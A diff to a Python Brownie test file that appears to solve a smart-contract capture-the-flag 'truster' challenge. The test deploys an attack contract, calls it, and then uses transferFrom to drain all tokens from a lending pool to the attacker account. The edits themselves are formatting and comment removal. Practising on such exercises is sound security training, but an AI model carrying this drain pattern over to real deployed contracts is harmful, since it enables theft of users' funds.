@@ -5,7 +5,8 @@ from brownie import accounts , Wei , exceptions
 
 deployer, attacker = None, None
 
-TOKENS_IN_POOL = Wei('1_000_000 ether')           # Pool has 1M * 10**18 tokens
+# Pool has 1M * 10**18 tokens
+TOKENS_IN_POOL = Wei('1_000_000 ether')  
 
 #--  [ SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE ] --#
 @pytest.fixture(scope="module")
@@ -31,9 +32,9 @@ def contracts():
 
     #---  [ SUCCESS CONDITIONS ]  ---#
     # Attacker has taken all tokens from the pool
-
     assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
     assert token.balanceOf(pool.address) == '0'
+
 
 def test_truster_challenge(contracts):
     #-- [ CODE YOUR EXPLOIT HERE ] ---#
@@ -43,7 +44,7 @@ def test_truster_challenge(contracts):
         contracts["token"].address,
         {"from":attacker}
     )
-    
+
     tx = attackTruster.attack(
             '0',
             attacker.address,
@@ -52,9 +53,6 @@ def test_truster_challenge(contracts):
         )
     tx.wait(1)
 
-        # let balance_aftr = await this.token.allowance(this.pool.address, attacker.address)
-        # // console.log("====> Allowance2 : ",await this.token.allowance(this.pool.address, attacker.address))
-        # console.log("====> Allowance2 : ",balance_aftr)
     contracts["token"].transferFrom(
         contracts["pool"].address, 
         attacker.address, 
